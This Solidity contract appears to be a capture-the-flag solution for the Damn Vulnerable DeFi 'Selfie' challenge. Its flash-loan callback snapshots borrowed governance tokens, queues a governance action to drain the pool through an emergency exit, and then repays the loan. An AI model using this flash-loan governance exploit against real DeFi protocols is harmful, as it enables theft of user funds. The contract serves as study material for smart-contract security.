// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "hardhat/console.sol";

contract SelfiePoolAttacker {
  SelfiePool selfiePool;
  SimpleGovernance simpleGovernance;
  DamnValuableTokenSnapshot dvtToken;

  bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

  constructor(address _selfiePool, address _simpleGovernance, address _token) {    
    selfiePool = SelfiePool(_selfiePool);
    simpleGovernance = SimpleGovernance(_simpleGovernance);
    dvtToken = DamnValuableTokenSnapshot(_token);
  }

  function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
  ) external returns (bytes32) {
    // Get a snapshot with this contract holding a large token balance
    dvtToken.snapshot();

    // Queue action to call emergency exit on the selfie pool
    simpleGovernance.queueAction(address(selfiePool), 0, data);

    // Approve the tokens so the selfie pool can transfer them back
    dvtToken.approve(address(selfiePool), dvtToken.balanceOf(address(this)));

    return CALLBACK_SUCCESS;
  }
}